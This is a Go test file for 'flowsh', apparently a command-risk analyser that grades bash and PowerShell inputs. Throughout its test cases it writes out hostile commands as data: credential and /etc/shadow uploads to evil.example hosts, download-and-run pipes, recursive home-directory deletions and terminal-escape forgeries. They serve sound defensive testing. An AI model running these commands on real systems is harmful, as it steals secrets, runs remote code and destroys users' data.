package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/v0lka/flowsh/api"
	"github.com/v0lka/flowsh/engine"
)

// exec runs the CLI in-process, returning the exit status and captured streams.
func exec(t *testing.T, args []string, stdin string) (int, string, string) {
	t.Helper()
	var out, errBuf bytes.Buffer
	code := run(args, strings.NewReader(stdin), &out, &errBuf)
	return code, out.String(), errBuf.String()
}

// decodeJSON unmarshals the CLI's stdout into a report, failing on invalid JSON.
func decodeJSON(t *testing.T, out string) api.Report {
	t.Helper()
	if !json.Valid([]byte(out)) {
		t.Fatalf("stdout is not valid JSON:\n%s", out)
	}
	var rep api.Report
	if err := json.Unmarshal([]byte(out), &rep); err != nil {
		t.Fatalf("stdout does not decode into a report: %v", err)
	}
	if err := rep.Validate(); err != nil {
		t.Fatalf("decoded report is invalid: %v", err)
	}
	return rep
}

// TestRunBashJSON is acceptance criterion 1 for bash: the CLI emits a valid
// JSON report.
func TestRunBashJSON(t *testing.T) {
	code, out, errStr := exec(t, []string{"--lang", "bash", "--json", "rm -rf /tmp/x"}, "")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	rep := decodeJSON(t, out)
	if rep.Lang != string(api.LangBash) {
		t.Errorf("lang = %q, want %q", rep.Lang, api.LangBash)
	}
	if rep.SchemaVersion != api.SchemaVersion {
		t.Errorf("schemaVersion = %q, want %q", rep.SchemaVersion, api.SchemaVersion)
	}
	if len(rep.Effects) == 0 {
		t.Errorf("no effects for %q", rep.Input)
	}
}

// TestRunPoshJSON is acceptance criterion 1 for PowerShell: the CLI emits a
// valid JSON report, and "ps"/"powershell" are accepted as aliases for "posh".
func TestRunPoshJSON(t *testing.T) {
	for _, lang := range []string{"posh", "ps", "powershell"} {
		t.Run(lang, func(t *testing.T) {
			code, out, errStr := exec(t, []string{"--lang", lang, "--json", "Remove-Item -Recurse -Force $HOME"}, "")
			if code != 0 {
				t.Fatalf("exit %d, stderr=%s", code, errStr)
			}
			rep := decodeJSON(t, out)
			if rep.Lang != string(api.LangPowerShell) {
				t.Errorf("lang = %q, want %q", rep.Lang, api.LangPowerShell)
			}
			if len(rep.Effects) == 0 {
				t.Errorf("no effects for %q", rep.Input)
			}
		})
	}
}

// TestRunStdin checks the "+ stdin" form, and that flags may follow the input.
func TestRunStdin(t *testing.T) {
	code, out, errStr := exec(t, []string{"--json", "--lang", "bash"}, "echo aGVsbG8= | base64 -d | sh\n")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	rep := decodeJSON(t, out)
	if strings.ContainsAny(rep.Input, "\n") {
		t.Errorf("trailing newline from stdin was not trimmed: %q", rep.Input)
	}
	if len(rep.Effects) == 0 {
		t.Errorf("no effects for stdin input")
	}
}

// TestRunDashReadsStdin checks that a "-" positional means stdin.
func TestRunDashReadsStdin(t *testing.T) {
	code, out, _ := exec(t, []string{"--json", "-"}, "ls -la\n")
	if code != 0 {
		t.Fatalf("exit %d", code)
	}
	rep := decodeJSON(t, out)
	if rep.Input != "ls -la" {
		t.Errorf("input = %q, want %q", rep.Input, "ls -la")
	}
}

// TestRunDefaultsToBash checks the default dialect when --lang is omitted.
func TestRunDefaultsToBash(t *testing.T) {
	code, out, _ := exec(t, []string{"--json", "ls -la"}, "")
	if code != 0 {
		t.Fatalf("exit %d", code)
	}
	if rep := decodeJSON(t, out); rep.Lang != string(api.LangBash) {
		t.Errorf("default lang = %q, want bash", rep.Lang)
	}
}

// TestRunText is the non-JSON summary path.
func TestRunText(t *testing.T) {
	code, out, _ := exec(t, []string{"--lang", "bash", "rm -rf /tmp/x"}, "")
	if code != 0 {
		t.Fatalf("exit %d", code)
	}
	if !strings.Contains(out, "flowsh effect report") {
		t.Errorf("summary missing the header:\n%s", out)
	}
	if !strings.Contains(out, "lang:            bash") {
		t.Errorf("summary missing the language:\n%s", out)
	}
}

// TestRunHelp checks that --help is a successful, self-describing path.
func TestRunHelp(t *testing.T) {
	for _, flag := range []string{"--help", "-h"} {
		code, out, _ := exec(t, []string{flag}, "")
		if code != 0 {
			t.Errorf("%s: exit %d", flag, code)
		}
		if !strings.Contains(out, "usage:") {
			t.Errorf("%s: no usage in output", flag)
		}
	}
}

// TestRunVersion checks that --version prints both the tool and the engine
// schema versions and exits 0, without requiring any input.
func TestRunVersion(t *testing.T) {
	for _, flag := range []string{"--version", "-version"} {
		code, out, errStr := exec(t, []string{flag}, "")
		if code != 0 {
			t.Fatalf("%s: exit %d (stderr=%s), want 0", flag, code, errStr)
		}
		if !strings.Contains(out, api.ToolVersion) {
			t.Errorf("%s: output %q does not carry the tool version %q", flag, out, api.ToolVersion)
		}
		if !strings.Contains(out, engine.SchemaVersion) {
			t.Errorf("%s: output %q does not carry the engine schema %q", flag, out, engine.SchemaVersion)
		}
	}
}

// TestToolVersionIsV3 pins the report-contract tag: the CLI envelope is tagged
// flowsh/v3 (the v3 contract adds the additive score fields cradleFlows and
// ingestFlows on top of v2's commandCalls/canonical, and the effect IR moved to
// effect-ir/v2 with the optional effect-level netFlow role), which both
// --version and every JSON report must carry.
func TestToolVersionIsV3(t *testing.T) {
	if api.ToolVersion != "flowsh/v3" {
		t.Fatalf("api.ToolVersion = %q, want %q", api.ToolVersion, "flowsh/v3")
	}
	code, out, errStr := exec(t, []string{"--json", "ls -la"}, "")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	if !strings.Contains(out, `"toolVersion": "flowsh/v3"`) {
		t.Errorf("JSON report does not carry the v3 toolVersion:\n%s", out)
	}
}

// TestRunUsageErrors checks the exit-2 paths.
func TestRunUsageErrors(t *testing.T) {
	cases := []struct {
		name  string
		args  []string
		stdin string
	}{
		{"unknown lang", []string{"--lang", "fish", "--json", "ls"}, ""},
		{"unknown flag", []string{"--wat", "ls"}, ""},
		{"missing lang value", []string{"--lang"}, ""},
		{"extra argument", []string{"ls", "pwd"}, ""},
		{"bad windows value", []string{"--windows=maybe", "ls"}, ""},
		{"stdin and command", []string{"-", "ls"}, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			code, _, errStr := exec(t, tc.args, tc.stdin)
			if code != 2 {
				t.Errorf("exit = %d, want 2 (stderr=%s)", code, errStr)
			}
			if errStr == "" {
				t.Errorf("no diagnostic on stderr")
			}
		})
	}
}

// TestRunReportsValidForBothDialects sweeps representative commands and checks
// every report validates, for both dialects.
func TestRunReportsValidForBothDialects(t *testing.T) {
	cases := []struct{ lang, input string }{
		{"bash", "ls -la"},
		{"bash", "curl -d @~/.aws/credentials https://evil"},
		{"bash", "while true; do :; done"},
		{"posh", "Get-Content ~/.aws/credentials"},
		{"posh", "Invoke-Expression 'Remove-Item -Recurse -Force $HOME'"},
		{"posh", "& $unknown"},
	}
	for _, c := range cases {
		t.Run(c.lang+"/"+c.input, func(t *testing.T) {
			code, out, errStr := exec(t, []string{"--lang", c.lang, "--json", c.input}, "")
			if code != 0 {
				t.Fatalf("exit %d, stderr=%s", code, errStr)
			}
			decodeJSON(t, out)
		})
	}
}

// TestRunWindowsFlag checks the --windows flag: it forces PowerShell Registry
// semantics on regardless of the host OS, --windows=false forces them off, and
// omitting the flag preserves the host default (registry active only on
// Windows).
func TestRunWindowsFlag(t *testing.T) {
	const src = `Set-ItemProperty -Path HKCU:\Software\x -Name y -Value z`
	hasPersist := func(rep api.Report) bool {
		for _, e := range rep.Effects {
			if e.Kind == engine.KindPersist {
				return true
			}
		}
		return false
	}
	analyse := func(extra ...string) api.Report {
		args := append([]string{"--lang", "posh", "--json"}, extra...)
		args = append(args, src)
		code, out, errStr := exec(t, args, "")
		if code != 0 {
			t.Fatalf("args=%v exit=%d stderr=%s", extra, code, errStr)
		}
		return decodeJSON(t, out)
	}

	if !hasPersist(analyse("--windows")) {
		t.Errorf("--windows: want a Persist effect for a registry command")
	}
	// security-review F22: the persistence of a registry write is a property of
	// the command, not of the analysing host, so it is reported under every
	// setting — a Linux/macOS control plane dispatching to Windows endpoints must
	// never be handed a clean report.
	if !hasPersist(analyse("--windows=false")) {
		t.Errorf("--windows=false: registry persistence must still be reported")
	}
	if !hasPersist(analyse()) {
		t.Errorf("default: registry persistence must be reported on every host")
	}
}

// nonEmptyLines splits s into its non-blank lines.
func nonEmptyLines(s string) []string {
	var out []string
	for _, ln := range strings.Split(s, "\n") {
		if strings.TrimSpace(ln) != "" {
			out = append(out, ln)
		}
	}
	return out
}

// TestRunLangAuto checks the --lang auto heuristic: representative shell inputs
// resolve to bash and representative PowerShell inputs to posh.
func TestRunLangAuto(t *testing.T) {
	cases := []struct {
		input string
		want  string
	}{
		{"ls -la", string(api.LangBash)},
		{"rm -rf /tmp/x", string(api.LangBash)},
		{"echo aGVsbG8= | base64 -d | sh", string(api.LangBash)},
		{"sudo chmod 777 /etc/passwd", string(api.LangBash)},
		{"curl -d @~/.aws/credentials https://evil", string(api.LangBash)},
		{"Remove-Item -Recurse -Force $HOME", string(api.LangPowerShell)},
		{"Get-Content ~/.aws/credentials", string(api.LangPowerShell)},
		{"Invoke-Expression 'Remove-Item -Recurse -Force $HOME'", string(api.LangPowerShell)},
		{`Set-ItemProperty -Path HKCU:\Software\x -Name y -Value z`, string(api.LangPowerShell)},
	}
	for _, c := range cases {
		t.Run(c.input, func(t *testing.T) {
			code, out, errStr := exec(t, []string{"--lang", "auto", "--json", c.input}, "")
			if code != 0 {
				t.Fatalf("exit %d, stderr=%s", code, errStr)
			}
			if got := decodeJSON(t, out).Lang; got != c.want {
				t.Errorf("--lang auto %q: lang = %q, want %q", c.input, got, c.want)
			}
		})
	}
}

// TestRunLangAutoDefault checks that auto never rejects input: an input with no
// dialect markers at all falls back to the default (bash).
func TestRunLangAutoDefault(t *testing.T) {
	code, out, errStr := exec(t, []string{"--lang", "auto", "--json", "while true; do :; done"}, "")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	if got := decodeJSON(t, out).Lang; got != string(api.LangBash) {
		t.Errorf("auto fallback lang = %q, want bash", got)
	}
}

// TestRunBatchNDJSON checks the batch mode: one compact JSON report per input
// line, in order, with --lang auto picking the dialect per line (blank lines
// skipped).
func TestRunBatchNDJSON(t *testing.T) {
	stdin := "ls -la\nRemove-Item -Recurse -Force $HOME\n\n  rm -rf /tmp/x  \n"
	code, out, errStr := exec(t, []string{"--batch", "--lang", "auto"}, stdin)
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	lines := nonEmptyLines(out)
	// One record per non-blank input line: if the reports were indented rather
	// than compact, the record count would exceed the input line count.
	if len(lines) != 3 {
		t.Fatalf("got %d NDJSON records, want 3:\n%s", len(lines), out)
	}
	wantLangs := []string{string(api.LangBash), string(api.LangPowerShell), string(api.LangBash)}
	wantInputs := []string{"ls -la", "Remove-Item -Recurse -Force $HOME", "rm -rf /tmp/x"}
	for i, ln := range lines {
		rep := decodeJSON(t, ln)
		if rep.Lang != wantLangs[i] {
			t.Errorf("record %d lang = %q, want %q", i, rep.Lang, wantLangs[i])
		}
		if rep.Input != wantInputs[i] {
			t.Errorf("record %d input = %q, want %q", i, rep.Input, wantInputs[i])
		}
		if len(rep.Effects) == 0 {
			t.Errorf("record %d: no effects for %q", i, rep.Input)
		}
	}
}

// TestRunBatchStdin checks batch input read from stdin, with the shared root
// naming stdin as the source.
func TestRunBatchStdin(t *testing.T) {
	code, out, errStr := exec(t, []string{"--batch", "--lang", "bash"}, "ls -la\nrm -rf /tmp/x\n")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	lines := nonEmptyLines(out)
	if len(lines) != 2 {
		t.Fatalf("got %d records, want 2:\n%s", len(lines), out)
	}
	for i, ln := range lines {
		rep := decodeJSON(t, ln)
		if rep.Lang != string(api.LangBash) {
			t.Errorf("record %d lang = %q, want bash", i, rep.Lang)
		}
		if rep.Root != api.RootStdin {
			t.Errorf("record %d root = %q, want %q", i, rep.Root, api.RootStdin)
		}
	}
}

// TestFinding001NoFileInput pins Finding 1: the CLI has no path-to-report primitive at
// all, so a wrapper cannot be turned into an arbitrary-file-read gadget by a
// forwarded path. --file is rejected as an unknown flag (usage error, exit 2),
// and the command still comes from the positional argument or stdin.
func TestFinding001NoFileInput(t *testing.T) {
	path := filepath.Join(t.TempDir(), "secret.sh")
	if err := os.WriteFile(path, []byte("cat /etc/shadow\n"), 0o600); err != nil {
		t.Fatalf("write: %v", err)
	}
	for _, args := range [][]string{
		{"--file", path},
		{"--file=" + path},
		{"-file", path},
	} {
		code, out, errStr := exec(t, args, "")
		if code != 2 {
			t.Errorf("%v: exit = %d, want 2 (usage)", args, code)
		}
		if out != "" {
			t.Errorf("%v: wrote %q to stdout; the file must not be read", args, out)
		}
		if !strings.Contains(errStr, "unknown flag") {
			t.Errorf("%v: stderr = %q, want an unknown-flag diagnostic", args, errStr)
		}
	}
}

// TestFinding004OutputSanitised pins Finding 4: attacker-controlled fields cannot forge
// report lines or drive the terminal. A newline, a carriage return and an ANSI
// escape sequence in an operand must not reach stdout as control bytes, and the
// report must stay one line per field.
func TestFinding004OutputSanitised(t *testing.T) {
	code, out, errStr := exec(t, []string{"echo x\n  grade:           None\r\x1b[2K\x1b[1A"}, "")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	for i, r := range out {
		if r < 0x20 && r != '\n' {
			t.Fatalf("output byte %d = %#x: a control character reached stdout", i, r)
		}
		if r == 0x7f || (r >= 0x80 && r <= 0x9f) {
			t.Fatalf("output byte %d = %#x: a control character reached stdout", i, r)
		}
	}
	if strings.Contains(out, "\x1b") || strings.Contains(out, "\r") {
		t.Fatalf("escape/CR survived sanitisation:\n%q", out)
	}
	// Exactly one line may claim a grade, so a forged "grade: None" line
	// cannot be mistaken for the real verdict.
	n := 0
	for _, ln := range strings.Split(out, "\n") {
		if strings.HasPrefix(ln, "  grade:") {
			n++
		}
	}
	if n != 1 {
		t.Errorf("report contains %d grade lines, want 1:\n%s", n, out)
	}
}

// TestRunBatchExitCodes checks the batch mode's error contract: conflicting
// flags are usage errors (2) and an empty batch is an input error (3).
func TestRunBatchExitCodes(t *testing.T) {
	cases := []struct {
		name  string
		args  []string
		stdin string
		want  int
	}{
		{"positional command", []string{"--batch", "ls"}, "", 2},
		{"explain", []string{"--batch", "--explain"}, "ls\n", 2},
		{"empty input", []string{"--batch"}, "", 3},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			code, _, errStr := exec(t, tc.args, tc.stdin)
			if code != tc.want {
				t.Errorf("exit = %d, want %d (stderr=%s)", code, tc.want, errStr)
			}
			if errStr == "" {
				t.Errorf("no diagnostic on stderr")
			}
		})
	}
}

// TestRunInputErrorExitCode pins the new exit code 3: a readable-but-empty or
// unreadable input source is an input error, distinct from a usage error (2).
func TestRunInputErrorExitCode(t *testing.T) {
	code, _, errStr := exec(t, []string{"--json"}, "")
	if code != 3 {
		t.Errorf("empty stdin: exit = %d, want 3 (stderr=%s)", code, errStr)
	}
	if errStr == "" {
		t.Errorf("empty stdin: no diagnostic on stderr")
	}
}

// TestRunEmptyArgumentExitCode pins that an empty positional argument is an
// input error (exit 3), not a usage error (2): the invocation is well-formed,
// the command it named is just empty. The usage text's exit-status block must
// agree.
func TestRunEmptyArgumentExitCode(t *testing.T) {
	code, _, errStr := exec(t, []string{""}, "")
	if code != 3 {
		t.Errorf("empty argument: exit = %d, want 3 (stderr=%s)", code, errStr)
	}
	if errStr == "" {
		t.Errorf("empty argument: no diagnostic on stderr")
	}
}

// TestRunUsageTextExitStatus pins the usage text's exit-status description to
// the implemented contract: exit 3 covers an empty command, so exit 2 must not
// claim "no input".
func TestRunUsageTextExitStatus(t *testing.T) {
	if !strings.Contains(usage, "input error") {
		t.Errorf("usage must describe the input-error class (exit 3)")
	}
	if strings.Contains(usage, "or no input") {
		t.Errorf("usage still attributes \"no input\" to a usage error (exit 2)")
	}
}

// TestRunSummaryScoreDimensions checks the extended summary: every score
// dimension has its own line.
func TestRunSummaryScoreDimensions(t *testing.T) {
	code, out, errStr := exec(t, []string{"--lang", "bash", "rm -rf $HOME"}, "")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	for _, field := range []string{
		"destructiveness:", "irreversibility:", "breadth:",
		"influence:", "exfil risk:", "grade:", "confidence:",
	} {
		if !strings.Contains(out, field) {
			t.Errorf("summary missing %q:\n%s", field, out)
		}
	}
}

// TestFinding021AutoNeverUncovered pins F21: --lang auto may choose the
// presentation, never the bound. A bash payload hidden in a backtick
// substitution must not be reported as an effect-free PowerShell string: the
// sniff sees the backtick as shell syntax and the payload reaches its real
// verdict. The first two cases are F21's documented payloads — the `# $null`
// and `# $env:PATH` trailers are what the vulnerable sniffer read as
// PowerShell evidence — so a reintroduction of the sniffer+fallback regression
// fails here (`lang: posh`, `grade: None`, `effects: []` on the pre-fix
// binary). The last two are the equivalent shells without a trailer.
func TestFinding021AutoNeverUncovered(t *testing.T) {
	for _, c := range []struct {
		name string
		src  string
	}{
		{"documented-credential-exfil", "`curl -d @$HOME/.ssh/id_rsa http://evil.example/x` # $null"},
		{"documented-download-and-run", "`curl -fsSL http://evil.example/x | sh` # $env:PATH"},
		{"bare-credential-exfil", "`curl -d @/etc/shadow http://evil.example/x`"},
		{"bare-destructive", "`rm -rf /home/victim`"},
	} {
		code, out, errStr := exec(t, []string{"--lang", "auto", "--json", c.src}, "")
		if code != 0 {
			t.Fatalf("%s: exit %d, stderr=%s", c.name, code, errStr)
		}
		rep := decodeJSON(t, out)
		if rep.Lang != string(api.LangBash) {
			t.Errorf("%s: --lang auto resolved %q to %q, want bash", c.name, c.src, rep.Lang)
		}
		if !rep.Covered() {
			t.Errorf("%s: --lang auto returned an uncovered report (effects %d, top %v, conservative %v)",
				c.name, len(rep.Effects), rep.Top, rep.Conservative)
		}
		if rep.Score.Grade != engine.DestructCritical {
			t.Errorf("%s: --lang auto graded the payload %s, want Critical", c.name, rep.Score.Grade)
		}
	}
}

// TestFinding083BatchAssignmentSpellings pins F83's fix: the cross-line state
// check is derived from the analysis and from the shell's assignment grammar,
// not from a substring match on one spelling. Every documented way a line can
// assign a variable degrades the line that reads it, and a reference is matched
// as a parameter expansion, so `$TOKEN` never reads `T`.
func TestFinding083BatchAssignmentSpellings(t *testing.T) {
	for _, c := range []struct {
		name  string
		first string
		use   string
	}{
		{"plain", `T=$(cat /etc/shadow)`, `curl -d "$T" https://e.test`},
		{"IFS-read", `IFS= read -r T < /etc/shadow`, `curl -d "$T" https://e.test`},
		{"read", `read -r T < /etc/shadow`, `curl -d "$T" https://e.test`},
		{"printf-v", `printf -v T %s "$(cat /etc/shadow)"`, `curl -d "$T" https://e.test`},
		{"append", `T=$(cat /etc/shadow); T+=x`, `curl -d "$T" https://e.test`},
		{"array-element", `T[0]=$(cat /etc/shadow)`, `curl -d "${T[0]}" https://e.test`},
		{"declare", `declare T=$(cat /etc/shadow)`, `curl -d "${T}" https://e.test`},
		{"export", `export T=$(cat /etc/shadow)`, `curl -d "$T" https://e.test`},
		{"for-loop", `for T in /etc/shadow; do :; done`, `curl -d "$T" https://e.test`},
		{"getopts", `getopts ab T`, `curl -d "$T" https://e.test`},
	} {
		stdin := c.first + "\n" + c.use + "\n"
		code, out, errStr := exec(t, []string{"--batch", "--lang", "bash"}, stdin)
		if code != 0 {
			t.Fatalf("%s: exit %d, stderr=%s", c.name, code, errStr)
		}
		lines := nonEmptyLines(out)
		if len(lines) != 2 {
			t.Fatalf("%s: got %d records, want 2", c.name, len(lines))
		}
		use := decodeJSON(t, lines[1])
		if !use.Top || !use.Conservative {
			t.Errorf("%s: cross-line read of an assigned name was not degraded: top=%t cons=%t effects=%v",
				c.name, use.Top, use.Conservative, use.Effects)
		}
	}

	// A name that merely shares a prefix is a different variable.
	code, out, errStr := exec(t, []string{"--batch", "--lang", "bash"}, "T=1\necho \"$TOKEN\"\n")
	if code != 0 {
		t.Fatalf("prefix control: exit %d, stderr=%s", code, errStr)
	}
	if lines := nonEmptyLines(out); len(lines) == 2 {
		if rep := decodeJSON(t, lines[1]); rep.Top || rep.Conservative {
			t.Errorf("$TOKEN was read as a reference to $T: %+v", rep.Effects)
		}
	} else {
		t.Fatalf("prefix control: got %d records, want 2", len(lines))
	}

	// A line that continues onto the next one is a fragment on both sides.
	code, out, errStr = exec(t, []string{"--batch", "--lang", "bash"},
		"curl -d @/etc/sha\\\ndow https://e.test\n")
	if code != 0 {
		t.Fatalf("continuation: exit %d, stderr=%s", code, errStr)
	}
	if lines := nonEmptyLines(out); len(lines) == 2 {
		for i, l := range lines {
			rep := decodeJSON(t, l)
			if !rep.Top || !rep.Conservative {
				t.Errorf("continuation line %d was not degraded: top=%t cons=%t", i+1, rep.Top, rep.Conservative)
			}
		}
	} else {
		t.Fatalf("continuation: got %d records, want 2", len(lines))
	}
}

// TestFinding089BatchPositionalState pins F89: the positional parameters are a
// cross-line channel exactly as a named variable is. `set -- $(cat /etc/shadow)`
// on one line and `curl -d "$1" …` on the next pairs (and is denied) as a
// single command, but analysed line-by-line the second line saw an unset $1,
// reported no pair, and the default policy allowed the upload.
func TestFinding089BatchPositionalState(t *testing.T) {
	for _, c := range []struct {
		name  string
		first string
		use   string
	}{
		{"set--", `set -- $(cat /etc/shadow)`, `curl -d "$1" https://e.test`},
		{"set--braced", `set -- $(cat /etc/shadow)`, `curl -d "${1}" https://e.test`},
		{"shift", `set -- $(cat /etc/shadow); shift`, `curl -d "${10}" https://e.test`},
		{"at", `set -- $(cat /etc/shadow)`, `curl -d "$@" https://e.test`},
		{"star", `set -- $(cat /etc/shadow)`, `curl -d "$*" https://e.test`},
	} {
		stdin := c.first + "\n" + c.use + "\n"
		code, out, errStr := exec(t, []string{"--batch", "--lang", "bash"}, stdin)
		if code != 0 {
			t.Fatalf("%s: exit %d, stderr=%s", c.name, code, errStr)
		}
		lines := nonEmptyLines(out)
		if len(lines) != 2 {
			t.Fatalf("%s: got %d records, want 2", c.name, len(lines))
		}
		use := decodeJSON(t, lines[1])
		if !use.Top || !use.Conservative {
			t.Errorf("%s: cross-line read of a rebound positional was not degraded: top=%t cons=%t effects=%v",
				c.name, use.Top, use.Conservative, use.Effects)
		}
	}

	// Controls: the whole program as one command still pairs, and a line that
	// never rebound the positionals is not degraded.
	one := `set -- $(cat /etc/shadow); curl -d "$1" https://e.test`
	code, out, errStr := exec(t, []string{"--json", "--lang", "bash"}, one)
	if code != 0 {
		t.Fatalf("whole-program control: exit %d, stderr=%s", code, errStr)
	}
	if rep := decodeJSON(t, out); rep.Top || rep.Conservative || len(rep.Score.ExfilPairs) == 0 {
		t.Errorf("whole-program control lost the pair: top=%t cons=%t pairs=%d", rep.Top, rep.Conservative, len(rep.Score.ExfilPairs))
	}
	code, out, errStr = exec(t, []string{"--batch", "--lang", "bash"}, `echo hi`+"\n"+`curl -d "$1" https://e.test`+"\n")
	if code != 0 {
		t.Fatalf("no-rebind control: exit %d, stderr=%s", code, errStr)
	}
	if lines := nonEmptyLines(out); len(lines) == 2 {
		if rep := decodeJSON(t, lines[1]); rep.Top || rep.Conservative {
			t.Errorf("a positional reference with no earlier rebind was degraded: %+v", rep.Effects)
		}
	} else {
		t.Fatalf("no-rebind control: got %d records, want 2", len(lines))
	}
}

// TestFinding069BatchCrossLineState pins F69: --batch analyses one command per
// line, so a variable assigned on an earlier line is not in the next line's Σ.
// A later line that references such a name is degraded to ⊤/conservative
// instead of being analysed against an unset variable (which hid the
// exfiltration pair the whole-program analysis finds).
func TestFinding069BatchCrossLineState(t *testing.T) {
	stdin := "T=$(cat /etc/shadow)\ncurl -d \"$T\" http://evil.example/u\n"
	code, out, errStr := exec(t, []string{"--batch", "--lang", "bash"}, stdin)
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	lines := nonEmptyLines(out)
	if len(lines) != 2 {
		t.Fatalf("got %d records, want 2", len(lines))
	}
	second := decodeJSON(t, lines[1])
	if !second.Top || !second.Conservative {
		t.Errorf("cross-line use was not degraded to ⊤/conservative: top=%t cons=%t grade=%s",
			second.Top, second.Conservative, second.Score.Grade)
	}
	// An independent line that references no earlier assignment stays exact.
	code, out, errStr = exec(t, []string{"--batch", "--lang", "bash"}, "X=1\nrm -rf /tmp/x\n")
	if code != 0 {
		t.Fatalf("independent batch: exit %d, stderr=%s", code, errStr)
	}
	rc := nonEmptyLines(out)
	if len(rc) != 2 {
		t.Fatalf("independent batch: got %d records, want 2", len(rc))
	}
	if rep := decodeJSON(t, rc[1]); rep.Top || rep.Conservative {
		t.Errorf("independent line was degraded: top=%t cons=%t", rep.Top, rep.Conservative)
	}
}
